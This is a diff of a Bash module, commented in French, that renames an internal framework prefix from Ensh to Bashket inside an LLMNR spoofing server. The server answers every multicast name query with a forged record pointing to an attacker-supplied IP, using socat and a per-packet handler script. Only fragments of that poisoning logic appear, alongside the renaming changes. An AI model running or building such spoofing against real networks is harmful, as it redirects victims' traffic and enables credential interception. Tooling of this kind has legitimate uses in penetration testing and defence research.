@@ -16,11 +16,11 @@
 #
 # ─────────────────────────────────────────────────────────────────────────────
 
-[[ -n "${_ENSH_PROTO_LLMNR_SERVER:-}" ]] && return 0
-readonly _ENSH_PROTO_LLMNR_SERVER=1
+[[ -n "${_BK_PROTO_LLMNR_SERVER:-}" ]] && return 0
+readonly _BK_PROTO_LLMNR_SERVER=1
 
-ensh::import core/log
-ensh::import protocol/llmnr/message
+bk::import core/log
+bk::import protocol/llmnr/message
 
 declare -g _LLMNR_SERVER_PID=""
 declare -g _LLMNR_SERVER_HANDLER=""
@@ -44,7 +44,7 @@ _llmnr_ip4_to_hex() {
 # Pour chaque requête reçue, forge une réponse A/AAAA avec <attacker_ip>.
 #
 # <callback_cmd> : commande bash optionnelle appelée avec (name src_ip) ;
-#                  doit être une commande exécutable (pas une fonction Ensh).
+#                  doit être une commande exécutable (pas une fonction Bashket).
 llmnr::server::start() {
     local iface="$1"
     local attacker_ip="$2"
@@ -60,16 +60,16 @@ llmnr::server::start() {
         return 1
     fi
 
-    local mcast="${ENSH_LLMNR_MCAST_IP:-${LLMNR_MCAST_V4}}"
-    local -i port="${ENSH_LLMNR_PORT:-${LLMNR_PORT}}"
-    local -i ttl="${ENSH_LLMNR_TTL:-${LLMNR_DEFAULT_TTL}}"
+    local mcast="${BK_LLMNR_MCAST_IP:-${LLMNR_MCAST_V4}}"
+    local -i port="${BK_LLMNR_PORT:-${LLMNR_PORT}}"
+    local -i ttl="${BK_LLMNR_TTL:-${LLMNR_DEFAULT_TTL}}"
 
     local attacker_hex
     _llmnr_ip4_to_hex "${attacker_ip}" attacker_hex
 
-    # Résoudre ENSH_ROOT à partir du chemin de ce script
-    local _ensh_root
-    _ensh_root="$(cd "$(dirname "${BASH_SOURCE[0]}")/../../.." && pwd)"
+    # Résoudre BK_ROOT à partir du chemin de ce script
+    local _bk_root
+    _bk_root="$(cd "$(dirname "${BASH_SOURCE[0]}")/../../.." && pwd)"
 
     # ── Handler bash écrit dans un fichier temporaire ─────────────────────────
     # socat (fork) exécute ce script pour chaque datagramme reçu :
@@ -92,9 +92,9 @@ set -uo pipefail
 _hex=\$(od -An -tx1 | tr -d ' \n' | tr '[:lower:]' '[:upper:]')
 [[ -n "\${_hex}" ]] || exit 0
 
-# Charger Ensh et le module LLMNR
-source "${_ensh_root}/ensh.sh"
-ensh::import protocol/llmnr/message
+# Charger Bashket et le module LLMNR
+source "${_bk_root}/bashket.sh"
+bk::import protocol/llmnr/message
 
 # Parser la requête
 declare -A _q
@@ -123,7 +123,7 @@ HANDLER_EOF
     # UDP4-RECVFROM:port,fork : reçoit les datagrammes, forke pour chaque un.
     # ip-add-membership : rejoint le groupe multicast (seulement si iface fournie).
     # reuseaddr : permet de redémarrer sans attendre TIME_WAIT.
-    local bind_ip="${ENSH_LLMNR_BIND_IP:-0.0.0.0}"
+    local bind_ip="${BK_LLMNR_BIND_IP:-0.0.0.0}"
     local socat_in="UDP4-RECVFROM:${port},bind=${bind_ip},reuseaddr,fork"
     if [[ -n "${iface}" ]]; then
         socat_in+=",ip-add-membership=${mcast}:${iface}"
